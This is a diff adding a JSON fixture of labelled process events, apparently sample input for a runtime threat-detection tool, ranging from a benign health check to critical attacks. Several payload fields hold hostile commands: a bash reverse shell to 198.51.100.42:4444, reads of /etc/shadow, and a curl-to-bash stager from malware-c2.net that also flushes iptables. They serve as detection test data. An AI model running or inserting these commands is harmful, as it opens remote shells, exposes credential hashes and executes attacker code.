@@ -1,0 +1,80 @@
+{
+  "default": {
+    "processId": 8942,
+    "parentProcessId": 1,
+    "userId": 0,
+    "mountNamespace": 4026531840,
+    "eventId": 157,
+    "argsNum": 6,
+    "returnValue": -1,
+    "suspendCount": 2,
+    "payload_text": "bash -i >& /dev/tcp/198.51.100.42/4444 0>&1 && sudo cat /etc/shadow"
+  },
+  "presets": [
+    {
+      "id": "benign-service",
+      "name": "Benign - Systemd Health Check",
+      "severity": "LOW",
+      "data": {
+        "processId": 2481,
+        "parentProcessId": 1204,
+        "userId": 1000,
+        "mountNamespace": 4026531840,
+        "eventId": 59,
+        "argsNum": 2,
+        "returnValue": 0,
+        "suspendCount": 0,
+        "payload_text": "python3 /opt/monitoring/health_check.py --interval=60"
+      }
+    },
+    {
+      "id": "suspicious-recon",
+      "name": "Suspicious - Unauthorized Credential Recon",
+      "severity": "MEDIUM",
+      "data": {
+        "processId": 4120,
+        "parentProcessId": 3810,
+        "userId": 1001,
+        "mountNamespace": 4026531840,
+        "eventId": 59,
+        "argsNum": 4,
+        "returnValue": -13,
+        "suspendCount": 0,
+        "payload_text": "cat /etc/passwd | grep -E 'root|admin' && cat /etc/shadow 2>/dev/null"
+      }
+    },
+    {
+      "id": "malicious-reverse-shell",
+      "name": "Critical - Interactive Reverse Shell Exploit",
+      "severity": "CRITICAL",
+      "data": {
+        "processId": 8942,
+        "parentProcessId": 1,
+        "userId": 0,
+        "mountNamespace": 4026531840,
+        "eventId": 157,
+        "argsNum": 6,
+        "returnValue": -1,
+        "suspendCount": 2,
+        "payload_text": "bash -i >& /dev/tcp/198.51.100.42/4444 0>&1 && sudo cat /etc/shadow"
+      }
+    },
+    {
+      "id": "malicious-curl-pipe",
+      "name": "Critical - C2 Stager Remote Script Execution",
+      "severity": "CRITICAL",
+      "data": {
+        "processId": 9812,
+        "parentProcessId": 102,
+        "userId": 0,
+        "mountNamespace": 4026531840,
+        "eventId": 101,
+        "argsNum": 8,
+        "returnValue": -1,
+        "suspendCount": 1,
+        "payload_text": "curl -s http://malware-c2.net/stage2.sh | bash && iptables -F"
+      }
+    }
+  ]
+}
+
